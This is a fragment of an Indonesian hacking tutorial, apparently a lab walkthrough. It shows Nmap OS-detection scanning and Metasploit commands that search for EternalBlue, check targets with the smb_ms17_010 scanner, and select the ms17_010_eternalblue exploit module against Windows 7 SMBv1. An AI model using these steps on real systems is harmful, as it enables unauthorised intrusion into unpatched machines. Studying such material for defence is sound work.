...
Untuk mencari target Windows 7, kita harus menggunakan teknik scan OS dari Nmap caranya:
...
**Keterangan:**
- `-sS` : Menggunakan teknik SYN scan
- `-T4` : Templat waktu (semakin tinggi semakin cepat)
- `-O` : Enable scan OS (mengaktifkan scan sistem operasi)
- `-iL` : File yang berisi host yang mau di-scan: `host.txt`
...
#### 3. Cek Apakah Target (Windows 7) Rentan atau Tidak
...
**Cari modul EternalBlue:**

```
search EternalBlue
```

**Gunakan modul `auxiliary/scanner/smb/smb_ms17_010` untuk mencari apakah taregt rentan atau tidak:**
...
**Pindah ke modul utama Metasploit:**

```
back
```

**Gunakan modul `exploit/windows/smb/ms17_010_eternalblue` untuk mengekploitasi SMBv1 (EternalBLue):**
...
IP Address kita adalah `192.168.1.42`.
